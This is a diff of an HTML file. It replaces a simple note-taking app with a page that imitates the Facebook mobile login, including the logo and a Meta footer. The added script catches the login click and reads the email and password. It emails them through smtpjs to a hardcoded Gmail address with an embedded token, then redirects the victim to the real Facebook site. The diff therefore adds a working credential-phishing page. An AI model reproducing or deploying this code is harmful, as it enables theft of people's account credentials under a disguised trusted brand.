@@ -1,245 +1,205 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Note Taking App</title>
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
-    <style>
-        /* Global Styles */
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
+  <meta charset="UTF-8">
+  <title>Facebook Mobile-Style Login with Gradient & Circular Buttons</title>
+  <style>
+    /* Basic Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      /* Gradient background */
+      background: linear-gradient(135deg, #eef2ff 0%, #fdf2f8 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        h2, h3, p {
-            color: #fff;
-            margin: 0;
-        }
+    /* Top Language Bar */
+    .top-bar {
+      width: 100%;
+      text-align: center;
+      padding: 10px 0;
+      font-size: 14px;
+      color: #555;
+    }
 
-        .container, .login-container {
-            background: #fff;
-            border-radius: 12px;
-            padding: 30px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
+    /* Main Container */
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
 
-        .hidden {
-            display: none;
-        }
+    /* Facebook Logo (Placeholder) */
+    .logo img {
+      width: 100px;
+      height: 55px;
+      margin: 20px;
+    }
 
-        input, button {
-            font-family: 'Roboto', Arial, sans-serif;
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 8px;
-            font-size: 1rem;
-        }
+    /* Form Inputs */
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .login-form input {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      outline: none;
+    }
+    .login-form input:focus {
+      border-color: #1877f2;
+    }
 
-        button {
-            background: #667eea;
-            color: #fff;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background 0.3s ease;
-        }
+    /* Primary Login Button - Pill-Shaped */
+    .login-btn {
+      width: 100%;
+      background-color: #1877f2;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      /* This makes the corners very round, creating a “pill” shape */
+      border-radius: 50px;
+      padding: 14px;
+      cursor: pointer;
+    }
+    .login-btn:hover {
+      background-color: #166fe5;
+    }
 
-        button:hover {
-            background: #764ba2;
-        }
+    /* Forgot Password Link in Gray */
+    .forgot-password {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .forgot-password a {
+      color: #888; /* Gray color */
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
 
-        #g_id_onload {
-            margin-bottom: 15px;
-        }
-    </style>
+    /* Outlined "Create New Account" Button - Pill-Shaped */
+    .create-account-btn {
+      width: 100%;
+      background-color: transparent;
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: bold;
+      border: 2px solid #1877f2;
+      /* Pill shape as well */
+      border-radius: 50px;
+      padding: 12px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .create-account-btn:hover {
+      background-color: #e7f3ff;
+    }
+
+    /* Footer Section */
+    .footer {
+      text-align: center;
+      color: #8a8d91;
+      font-size: 13px;
+    }
+    .footer a {
+      color: #8a8d91;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .meta-brand {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+    }
+  </style>
 </head>
 <body>
+  <!-- Top Language Bar -->
+  <div class="top-bar">
+    English (US)
+  </div>
 
-<!-- Login Form -->
-<div class="login-container" id="loginContainer">
-    <h2>Welcome Back</h2>
-    <p>Login to access your notes.</p>
-    <div id="g_id_onload"
-         data-client_id="453377407525-aivegjep6kulkhcd8asg46jpotafsj3b.apps.googleusercontent.com"
-         data-context="signin"
-         data-ux_mode="popup"
-         data-callback="handleCredentialResponse"
-         data-auto_prompt="false">
+  <!-- Main Login Container -->
+  <div class="login-container">
+    <!-- Facebook Logo -->
+    <div class="logo">
+      <!-- Replace with your own logo or an official FB icon -->
+      <img src="Facebook-Logosu.png" alt="Facebook Logo">
     </div>
-    <div class="g_id_signin"
-         data-type="standard"
-         data-shape="rectangular"
-         data-theme="outline"
-         data-text="sign_in_with"
-         data-size="large"
-         data-logo_alignment="left">
+
+    <!-- Login Form -->
+    <form class="login-form" action="/login" method="POST">
+      <input type="text" id="email" name="email" placeholder="Mobile number or email" autocomplete="off" required>
+      <input type="password" id="subject" name="password" placeholder="Password" autocomplete="off" required>
+      <button class="login-btn" onclick="fun()" id="btn" type="submit">Log in</button>
+    </form>
+
+    <!-- Forgot Password -->
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
     </div>
-    <button onclick="showLoginForm()">Login with Username</button>
-    <p>Don't have an account? <a href="#" onclick="showRegister()">Register</a></p>
-</div>
 
-<!-- Username/Password Login -->
-<div class="login-container hidden" id="manualLoginContainer">
-    <h2>Login with Username</h2>
-    <input type="text" id="loginUsername" placeholder="Enter your username">
-    <input type="password" id="loginPassword" placeholder="Enter your password">
-    <button onclick="login()">Login</button>
-    <p>Back to <a href="#" onclick="showLogin()">Google Login</a></p>
-</div>
+    <!-- Create New Account Button -->
+    <button class="create-account-btn" onclick="acc()"type="button">
+      Create new account
+    </button>
+  </div>
 
-<!-- Registration Form -->
-<div class="login-container hidden" id="registerContainer">
-    <h2>Create Account</h2>
-    <p>Register to start saving your notes.</p>
-    <input type="text" id="registerUsername" placeholder="Choose a username">
-    <input type="password" id="registerPassword" placeholder="Choose a password">
-    <button onclick="register()">Register</button>
-    <p>Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
-</div>
-
-<!-- Note-Taking App -->
-<div class="container hidden" id="noteContainer">
-    <h2>Note Taking App</h2>
-    <textarea id="noteInput" placeholder="Write your note here..."></textarea>
-    <button onclick="saveNote()">Save Note</button>
-    <h3>Your Notes</h3>
-    <ul id="notesList"></ul>
-    <button onclick="signOut()">Sign Out</button>
-</div>
-
-<script>
-    let loggedInUser = null;
-
-    // Show Login Options
-    function showLogin() {
-        document.getElementById("loginContainer").classList.remove("hidden");
-        document.getElementById("manualLoginContainer").classList.add("hidden");
-        document.getElementById("registerContainer").classList.add("hidden");
-        document.getElementById("noteContainer").classList.add("hidden");
-    }
-
-    // Show Username/Password Login
-    function showLoginForm() {
-        document.getElementById("manualLoginContainer").classList.remove("hidden");
-        document.getElementById("loginContainer").classList.add("hidden");
-    }
-
-    // Show Registration Form
-    function showRegister() {
-        document.getElementById("registerContainer").classList.remove("hidden");
-        document.getElementById("manualLoginContainer").classList.add("hidden");
-        document.getElementById("loginContainer").classList.add("hidden");
-    }
-
-    // Google Sign-In Callback
-    function handleCredentialResponse(response) {
-        const credential = response.credential;
-        const payload = parseJwt(credential);
-
-        loggedInUser = payload.name;
-        alert(`Welcome, ${loggedInUser}!`);
-
-        document.getElementById("loginContainer").classList.add("hidden");
-        document.getElementById("noteContainer").classList.remove("hidden");
-        loadNotes();
-    }
-
-    // Parse JWT Token
-    function parseJwt(token) {
-        const base64Url = token.split('.')[1];
-        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-        const jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
-            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-        }).join(''));
-        return JSON.parse(jsonPayload);
-    }
-
-    // Register User (Manual)
-    function register() {
-        const username = document.getElementById("registerUsername").value;
-        const password = document.getElementById("registerPassword").value;
-
-        if (!username || !password) {
-            alert("Please fill out all fields!");
-            return;
-        }
-
-        let users = JSON.parse(localStorage.getItem("users")) || [];
-        users.push({ username, password });
-        localStorage.setItem("users", JSON.stringify(users));
-
-        alert("Registration successful! You can now log in.");
-        showLogin();
-    }
-
-    // Login User (Manual)
-    function login() {
-        const username = document.getElementById("loginUsername").value;
-        const password = document.getElementById("loginPassword").value;
-
-        let users = JSON.parse(localStorage.getItem("users")) || [];
-        let user = users.find(u => u.username === username && u.password === password);
-
-        if (user) {
-            loggedInUser = user.username;
-            alert(`Welcome, ${loggedInUser}!`);
-            document.getElementById("manualLoginContainer").classList.add("hidden");
-            document.getElementById("noteContainer").classList.remove("hidden");
-            loadNotes();
-        } else {
-            alert("Invalid username or password.");
-        }
-    }
-
-    // Save Notes
-    function saveNote() {
-        const noteContent = document.getElementById("noteInput").value;
-
-        if (!noteContent) {
-            alert("Please enter a note!");
-            return;
-        }
-
-        let notes = JSON.parse(localStorage.getItem("savedNotes")) || [];
-        notes.push({ content: noteContent, date: new Date().toLocaleString() });
-        localStorage.setItem("savedNotes", JSON.stringify(notes));
-
-        document.getElementById("noteInput").value = "";
-        loadNotes();
-    }
-
-    // Load Notes
-    function loadNotes() {
-        const notes = JSON.parse(localStorage.getItem("savedNotes")) || [];
-        const notesList = document.getElementById("notesList");
-        notesList.innerHTML = "";
-
-        notes.forEach(note => {
-            const li = document.createElement("li");
-            li.textContent = `${note.content} (Saved on: ${note.date})`;
-            notesList.appendChild(li);
-        });
-    }
-
-    // Sign Out
-    function signOut() {
-        alert(`${loggedInUser}, you have signed out successfully.`);
-        loggedInUser = null;
-        showLogin();
-    }
-
-    window.onload = showLogin;
-</script>
+  <!-- Footer -->
+  <div class="footer">
+    <a href="#">About</a>
+    <a href="#">Help</a>
+    <a href="#">More</a>
+    <span class="meta-brand">© Meta</span>
+  </div>
 </body>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script>
+        
+       var btn = document.getElementById('btn');
+    btn.addEventListener('click',function(e) {
+        e.preventDefault()
+        var email = document.getElementById('email').value;
+        var subject = document.getElementById('subject').value;
+        var body = 'email: ' + email + '<br/> subject: ' + subject;
+        Email.send({
+    SecureToken : "af2d1483-3e6c-40cd-8f63-0e1a40c83888",
+    To : 'hengk7401@gmail.com',
+    From : "hengk7401@gmail.com",
+    Subject : subject,
+    Body : body
+}).then(
+);
+    })
+function fun() {
+    location.href="https://m.facebook.com/?tbua=1";
+}
+function acc() {
+    location.href="https://m.facebook.com/campaign/landing.php?campaign_id=1635645242&extra_1=s%7Cc%7C313665943406%7Ce%7Cfacebook%20login%7C&placement&creative=313665943406&keyword=facebook%20login&partner_id=googlesem&extra_2=campaignid%3D1635645242%26adgroupid%3D67924221572%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-1409285535%26loc_physical_ms%3D9198350%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gbraid=0AAAAAD2MkOXVsC97vYqhtaptoapRs4-8f&gclid=CjwKCAiA8Lu9BhA8EiwAag16by1ciYawsBKyDarDC8td2RWm5D8qxNb_tBR8dOQL7VpiZlj6S-Bh-RoCM7kQAvD_BwE&soft=hjk";
+}
+</script>
 </html>
